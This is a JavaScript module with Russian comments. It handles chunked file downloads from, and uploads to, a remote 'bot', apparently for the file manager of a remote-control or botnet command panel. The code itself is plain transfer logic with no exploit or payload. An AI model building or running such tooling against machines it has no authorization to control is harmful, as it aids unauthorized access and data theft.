// frontend\client_control\js\modules\features\fm\file_transfer.js

/**
 * Логика передачи данных (Скачивание и Загрузка)
 */
export const FileTransfer = {
    sessions: {},

    // --- СКАЧИВАНИЕ (Download) ---
    // (Оставляем без изменений, так как прием работает идеально)
    handleDownloadStart(fileName, totalSize) {
        if (this.sessions[fileName]) return;
        this.sessions[fileName] = { chunks: [], received: 0, total: parseInt(totalSize) || 0, isFinished: false };
    },

    handleDownloadData(fileName, buffer) {
        const session = this.sessions[fileName];
        if (!session || session.isFinished) return;
        session.chunks.push(buffer);
        session.received += buffer.byteLength;
        if (session.total > 0 && session.received >= session.total) {
            this.finalizeDownload(fileName);
        } else {
            clearTimeout(session.timeout);
            session.timeout = setTimeout(() => this.finalizeDownload(fileName), 1500);
        }
    },

    finalizeDownload(fileName) {
        const session = this.sessions[fileName];
        if (!session || session.isFinished) return;
        session.isFinished = true;
        const blob = new Blob(session.chunks, { type: 'application/octet-stream' });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url; a.download = fileName; a.click();
        setTimeout(() => { window.URL.revokeObjectURL(url); delete this.sessions[fileName]; }, 500);
    },

    // --- ЗАГРУЗКА НА БОТ (Upload Transfer - UT) ---
    uploadFile(targetPath) {
        const input = document.createElement('input');
        input.type = 'file';
        
        input.onchange = e => {
            const file = e.target.files[0];
            if (!file || !window.sendToBot) return;

            const reader = new FileReader();
            reader.onload = () => {
                let cleanPath = targetPath.replace(/\\/g, '/').replace(/\/+$/, '');
                if (cleanPath === "Computer") {
                    alert("Выберите диск для загрузки");
                    return;
                }

                const fullPath = `${cleanPath}/${file.name}`;
                const fileSize = reader.result.byteLength;

                console.log(`[FM] UT_START: ${fullPath} (${fileSize} bytes)`);

                /**
                 * ЭТАП 1: Анонс размера (UT_START)
                 * Протокол требует: [FileManager:int:UT_START:путь] + [размер]
                 */
                window.sendToBot(
                    'FileManager', 
                    fileSize.toString(), 
                    'UT_START', 
                    fullPath, 
                    'int'
                );

                /**
                 * ЭТАП 2: Передача данных (UT_DATA)
                 * Протокол требует: [FileManager:bin:UT_DATA:путь] + [данные]
                 */
                setTimeout(() => {
                    console.log(`[FM] UT_DATA: Отправка чанка...`);
                    window.sendToBot(
                        'FileManager', 
                        reader.result, 
                        'UT_DATA', 
                        fullPath, 
                        'bin'
                    );
                }, 100); // Небольшая задержка, чтобы пакеты не склеились в сокете
            };
            
            reader.readAsArrayBuffer(file);
        };

        input.click();
    }
};